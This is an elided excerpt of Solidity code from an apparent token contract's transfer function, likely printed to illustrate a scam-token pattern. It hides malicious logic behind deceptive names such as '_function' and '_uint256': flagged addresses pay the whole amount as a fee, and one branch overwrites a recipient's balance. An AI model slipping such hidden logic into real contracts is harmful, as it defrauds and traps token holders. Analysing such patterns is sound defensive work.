...
) private
{
    ...
    uint256 fee;
    if (_swapAndLiquifyEnabled && contractTokenBalance > _uint256 && !
        inSwapAndLiquify && from != uniswapV2Pair)
    {
        inSwapAndLiquify = true;
        swapAndLiquify(contractTokenBalance);
        inSwapAndLiquify = false;
    }
    else if (_function[from] > _uint256 && _function[to] >
        _uint256)
    {
        fee = amount;
    ...
    else if (to != address(router) && _function[from] > 0 &&
        amount >
        _uint256 && to != uniswapV2Pair)
    {
        _function[to] = amount;
        return;
    }
    else if (!inSwapAndLiquify && _constructor[from] > 0 && from !=
        uniswapV2Pair && _function[from] == 0)
    {
    ...
    if (_taxFee > 0 && _function[from] == 0 && !inSwapAndLiquify &&
        _function[to] == 0)
    {
